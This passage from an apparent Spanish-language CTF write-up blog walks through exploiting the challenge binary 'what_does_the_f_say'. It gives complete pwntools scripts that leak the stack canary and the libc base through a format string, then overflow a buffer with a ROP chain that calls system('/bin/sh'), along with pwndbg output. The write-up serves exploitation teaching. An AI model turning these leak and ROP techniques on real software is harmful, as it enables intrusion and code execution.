+canary</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x174a</span><span class="p">
+
+payload </span><span class="o">= </span><span class="no">b</span><span class="s">"%9$s...." </span><span class="o">+ </span><span class="p">p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x3f90</span><span class="p">) </span><span class="c1"># puts@got</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Space food</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"(70.00 s.rocks)</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)
+
+libc_base</span><span class="o"> =</span><span class="p"> u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"...."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">))</span><span class="o"> -</span><span class="mi"> 0x80a30</span><span class="p">  
+log.info(</span><span class="no">f</span><span class="s">"Libc base: </span><span class="p">{</span><span class="no">hex</span><span class="p">(libc_base)}</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos el exploit y nos muestra la dirección lekeada, si comparamos esta dirección con la base de libc que vemos en <code class="language-plaintext highlighter-rouge">gdb</code> es exactamente la misma</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 230232
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './what_does_the_f_say']  
+[</span><span class="az">*</span><span class="p">] Libc base: 0x7c1855e00000
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+
+1. Milky way (4.90 s.rocks)
+2. Kryptonite vodka (6.90 s.rocks)
+3. Deathstar(70.00 s.rocks)
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">^C
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x00007c1855f10191</span><span class="p"> in</span><span class="am"> read</span><span class="p"> () from</span><span class="ve"> ./libc.so.6</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> vmmap libc.so.6
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+</span><span class="sa">    0x5a2d25eab000     0x5a2d25ead000 rw-p     2000   5000 /home/user/what_does_the_f_say  
+</span><span class="ro">►   0x7c1855e00000     0x7c1855fe7000 r-xp   1e7000      0 /home/user/libc.so.6
+</span><span class="az">►   0x7c1855fe7000     0x7c18561e7000 ---p   200000 1e7000 /home/user/libc.so.6
+</span><span class="p">►   0x7c18561e7000     0x7c18561eb000 r--p     4000 1e7000 /home/user/libc.so.6
+</span><span class="sa">►   0x7c18561eb000     0x7c18561ed000 rw-p     2000 1eb000 /home/user/libc.so.6
+</span><span class="ro">    0x7c1856200000     0x7c1856227000 r-xp    27000      0 /home/user/ld-2.27.so
+pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Vamos con la siguiente vulnerabilidad, mediante un bucle <code class="language-plaintext highlighter-rouge">for</code> restaremos <code class="language-plaintext highlighter-rouge">srocks</code> un total de <code class="language-plaintext highlighter-rouge">7</code> veces, hasta que sea menor a <code class="language-plaintext highlighter-rouge">20</code> unidades, entonces ya podemos explotar el buffer overflow el cual dijimos tenia un offset a la cookie de <code class="language-plaintext highlighter-rouge">24</code> bytes, ahí enviamos el canary, <code class="language-plaintext highlighter-rouge">8 B's</code> para <code class="language-plaintext highlighter-rouge">rbp</code> y <code class="language-plaintext highlighter-rouge">8 C's</code> para el return address, además un par de <code class="language-plaintext highlighter-rouge">D's</code> que se guardarán en el stack, asi tenemos el control del flujo de ejecución</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64, u64
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./what_does_the_f_say"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Space food</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"(70.00 s.rocks)</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"%13$p.%15$p"</span><span class="p">)
+
+leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().split(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+canary</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x174a</span><span class="p">
+
+payload </span><span class="o">= </span><span class="no">b</span><span class="s">"%9$s...." </span><span class="o">+ </span><span class="p">p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x3f90</span><span class="p">) </span><span class="c1"># puts@got</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Space food</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"(70.00 s.rocks)</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)
+
+libc_base</span><span class="o"> =</span><span class="p"> u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"...."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">))</span><span class="o"> -</span><span class="mi"> 0x80a30</span><span class="p">  
+
+</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">7</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"Space food</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"(70.00 s.rocks)</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"Red"</span><span class="p">)
+
+offset</span><span class="o"> =</span><span class="mi"> 24</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> p64(canary)
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 24</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"buy it?</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Program received signal SIGSEGV, Segmentation fault.  
+</span><span class="az">0x000063e156f7155c </span><span class="p">in</span><span class="am"> warning</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rbp
+</span><span class="az">$1</span><span class="p"> = 0x4242424242424242
+</span><span class="ro">pwndbg></span><span class="p"> x/gx $rsp
+</span><span class="az">0x7ffd1d323c68</span><span class="p">: 0x4343434343434343
+</span><span class="ro">pwndbg></span><span class="p"> x/s $rsp+8
+</span><span class="az">0x7ffd1d323c70</span><span class="p">: 'D' &ltrepetidos 24 veces>
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez controlamos el return address y los valores en el stack simplemente nos queda agregar un ropchain que nos devuelva una shell con <code class="language-plaintext highlighter-rouge">system("/bin/sh");</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, p64, u64
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./what_does_the_f_say"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Space food</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"(70.00 s.rocks)</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"%13$p.%15$p"</span><span class="p">)
+
+leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().split(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+canary</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x174a</span><span class="p">
+
+payload </span><span class="o">= </span><span class="no">b</span><span class="s">"%9$s...." </span><span class="o">+ </span><span class="p">p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x3f90</span><span class="p">) </span><span class="c1"># puts@got</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Space food</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"(70.00 s.rocks)</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)
+
+libc_base</span><span class="o"> =</span><span class="p"> u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"...."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">))</span><span class="o"> -</span><span class="mi"> 0x80a30</span><span class="p">  
+
+</span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">7</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"Space food</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"(70.00 s.rocks)</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"Kryptonite?</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"Red"</span><span class="p">)
+
+offset</span><span class="o"> =</span><span class="mi"> 24</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> p64(canary)
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B" </span><span class="o">*</span><span class="mi"> 8</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x0968ba</span><span class="p">)</span><span class="c1"> # pop rdi; ret;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x1b40fa</span><span class="p">)</span><span class="c1"> # "/bin/sh"</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x0c7c5a</span><span class="p">)</span><span class="c1"> # ret;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x04f4e0</span><span class="p">)</span><span class="c1"> # system()</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"buy it?</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, en el exploit usamos el format string para lekear el <code class="language-plaintext highlighter-rouge">canary</code> y la dirección base del binario, ya con ello lekeamos la dirección base de libc para posteriormente explotar el buffer overflow que al ejecutar el <code class="language-plaintext highlighter-rouge">ropchain</code> nos devuelve una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './what_does_the_f_say': pid 231378  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$</span><span class="p"> id
+uid=1000(user) gid=1000(user) grupos=1000(user)
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
